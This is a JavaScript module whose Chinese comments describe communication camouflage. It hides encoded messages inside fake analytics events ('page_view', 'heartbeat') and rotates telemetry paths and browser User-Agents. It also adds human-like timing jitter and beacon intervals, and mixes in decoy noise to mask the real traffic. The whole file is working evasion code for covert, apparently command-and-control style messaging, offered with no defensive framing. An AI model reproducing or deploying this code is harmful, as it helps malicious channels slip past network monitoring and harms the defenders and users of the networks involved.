// camouflage.js
// v2: 通信伪装。消息编码为"分析流量"，混入正常网络噪声。

const crypto = require("crypto")

// ============================================
// 伪装成分析/遥测数据包
// ============================================

// 模拟常见分析平台的端点路径
const TELEMETRY_PATHS = [
  "/collect", "/analytics", "/telemetry", "/ping",
  "/metrics", "/beacon", "/track", "/report",
  "/api/v1/events", "/log", "/diagnostics"
]

// 模拟 User-Agent 池
const UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
]

// ============================================
// 消息编码/解码
// ============================================

// 编码：将消息嵌入看起来随机的遥测数据中
function encodeTelemetry(type, payload) {
  const msg = Buffer.from(JSON.stringify({
    t: type,
    d: payload,
    s: Date.now(),
    n: Math.random().toString(36).slice(2, 6)
  })).toString("base64")

  // 把消息伪装成分析事件的属性值
  return {
    path: TELEMETRY_PATHS[Math.floor(Math.random() * TELEMETRY_PATHS.length)],
    headers: {
      "user-agent": UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
      "content-type": "application/json",
      "x-request-id": crypto.randomUUID(),
      "x-device-id": crypto.randomBytes(8).toString("hex")
    },
    body: {
      event: ["page_view", "session_start", "heartbeat", "app_open"][Math.floor(Math.random() * 4)],
      properties: {
        screen: `${Math.floor(Math.random() * 1920 + 800)}x${Math.floor(Math.random() * 1080 + 600)}`,
        locale: ["en-US", "zh-CN", "ja-JP", "de-DE"][Math.floor(Math.random() * 4)],
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Shanghai",
        // 真实数据嵌入到这里
        __d: msg
      },
      timestamp: Date.now()
    }
  }
}

// 解码：从遥测数据包中提取消息
function decodeTelemetry(packet) {
  try {
    const raw = packet?.body?.properties?.__d
    if (!raw) return null
    const parsed = JSON.parse(Buffer.from(raw, "base64").toString("utf-8"))
    return parsed
  } catch(e) {
    return null
  }
}

// ============================================
// 时序伪装：模拟人类行为的消息间隔
// ============================================

function humanDelay() {
  // 模拟阅读/打字间隔：300ms - 3000ms
  return 300 + Math.random() * 2700
}

function beaconInterval() {
  // 模拟标准遥测上报间隔：30s - 120s
  return 30000 + Math.random() * 90000
}

// ============================================
// 低熵噪声：混入无关消息掩盖真实通信
// ============================================

function noiseMessage() {
  const noises = [
    "scrolled", "clicked", "hover", "focus",
    "resize", "orientation_change", "visibility_change"
  ]
  return encodeTelemetry("noise", {
    event: noises[Math.floor(Math.random() * noises.length)],
    coord: `${Math.floor(Math.random() * 2000)},${Math.floor(Math.random() * 2000)}`,
    duration: Math.floor(Math.random() * 5000)
  })
}

module.exports = {
  encodeTelemetry,
  decodeTelemetry,
  humanDelay,
  beaconInterval,
  noiseMessage
}
